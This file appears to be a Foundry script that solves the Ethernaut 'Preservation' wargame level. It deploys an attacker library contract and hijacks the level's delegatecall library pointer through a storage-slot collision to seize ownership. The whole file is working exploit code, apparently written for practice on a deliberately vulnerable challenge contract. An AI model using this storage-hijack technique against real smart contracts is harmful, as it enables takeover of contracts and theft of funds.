// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Script} from "../lib/forge-std/src/Script.sol";
import {console} from "../lib/forge-std/src/console.sol";
import {HackTimeZoneLibraryContract} from "../src/Preservation.sol";

abstract contract LevelContract {
    address public owner;
    function setFirstTime(uint256 _timeStamp) virtual external;
}

contract PreservationScript is Script {
    function run() external {
        vm.startBroadcast();
        // 1. deloy hack timezone library
        HackTimeZoneLibraryContract htzlc = new HackTimeZoneLibraryContract();

        // 2. call set setFirstTime to change `timeZone1Library` to htzlc
        address levelContractAddress = 0xd05Ad9a4b4543400A9aC355A9550Db59ece9dE1d;
        LevelContract level = LevelContract(levelContractAddress);
        level.setFirstTime(uint256(uint160(address(htzlc))));

        // 3. call setFirstTime which is actually the hack contract's code
        level.setFirstTime(0x0);
        vm.stopBroadcast();
        console.log("owner address : ", level.owner());
    }
}
